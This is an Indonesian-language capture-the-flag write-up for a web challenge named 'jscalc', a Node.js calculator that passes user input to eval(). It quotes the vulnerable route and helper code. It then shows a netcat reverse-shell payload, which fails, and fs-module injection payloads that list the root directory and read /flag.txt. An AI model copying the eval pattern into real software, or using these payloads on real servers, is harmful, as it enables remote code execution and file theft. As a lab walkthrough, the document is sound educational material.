# jscalc

Target	: 167.99.85.216
Port	: 30174

Jika kita buka http://Target:Port, maka akan muncul halaman web untuk kalkulator dari javascript dengan menggunakan `eval()` function dengan title "A super secure Javascript calculator with the help of **eval()** 🤮", dan apakah ini benar-benar secure???????. `eval()` merupakan salah satu built-in function dalam JavaScript yang digunakan untuk mengeksekusi string sebagai kode JavaScript. Function ini mengambil string sebagai argumen dan mengeksekusinya sebagai kode JavaScript. Fungsi ini dapat digunakan untuk mengeksekusi dynamic code atau expression yang dibangun secara dinamis selama waktu eksekusi program. Jika kita lihat pada source codenya, lebih lengkapnya adalah seperti berikut
`web_jscalc/challenge/routes/index.js`
```js
const path       = require('path');
const express    = require('express');
const router     = express.Router();
const Calculator = require('../helpers/calculatorHelper');

const response = data => ({ message: data });

router.get('/', (req, res) => {
        return res.sendFile(path.resolve('views/index.html'));
});

router.post('/api/calculate', (req, res) => {
        let { formula } = req.body;

        if (formula) {
                result = Calculator.calculate(formula);
                return res.send(response(result));
        }

        return res.send(response('Missing parameters'));
})

module.exports = router;
```
`web_jscalc/challenge/helpers/calculatorHelper.js`
```js
module.exports = {
    calculate(formula) {
        try {
            return eval(`(function() { return ${ formula } ;}())`);

        } catch (e) {
            if (e instanceof SyntaxError) {
                return 'Something went wrong!';
            }
        }
    }
}
...
```

Jadi dari input yang kita masukkan di `index.html`, nantinya akan diproses ke api di `/api/calculate` dengan menjalankan function calculate yang ada di file `calculatorHelper.js` dengan value dari `formula` adalah input dari kita. Didalam file tersebut, akan melakukan blok try-catch, dimana dalam blok try akan melakukan `eval()` function, yang mana akan mengeksekusi string sebagai js code. Dalam hal ini, sebuah fungsi IIFE (Immediately Invoked Function Expression) digunakan untuk mengelilingi ekspresi matematika yang diteruskan. Ekspresi ini kemudian dijalankan dan hasilnya dikembalikan. Jika terjadi error, akan masuk ke blok catch, dan akan mengembalikan hasil string 'Something went wrong!'. Disini saya mencoba input `require("child_process").exec("nc -e bash <ip-local> <port>")`, namun hasilnya adalah `[object Object]`. Setelah melakukan sedikit searching, output tersebut diberikan karena kita menggunakan `exec` method dari `child_process` module, yang mana akan memberikan output ChildProcess object daripada output aslinya. Kita dapat coba untuk menggunakan `fs` module untuk berinteraksi dengan file system. Jadi akan seperti berikut
```js
require('fs').readdirSync('/').toString()
```
Input tersebut akan melakukan hal yang sama seperti jika kita melakukan `ls /`, dan kita akan mendapatkan hasil
```html
messages:"app,bin,dev,etc,flag.txt,home,lib,media,mnt,opt,proc,root,run,sbin,srv,sys,tmp,usr,var"
```
Ternyata berhasil, selain itu kita juga mendapat informasi bahwa `flag.txt` berada di `/`, maka kita dapat membaca isinya dengan cara
```js
require('fs').readFileSync('/flag.txt').toString()
```
dan kita akan mendapat flag.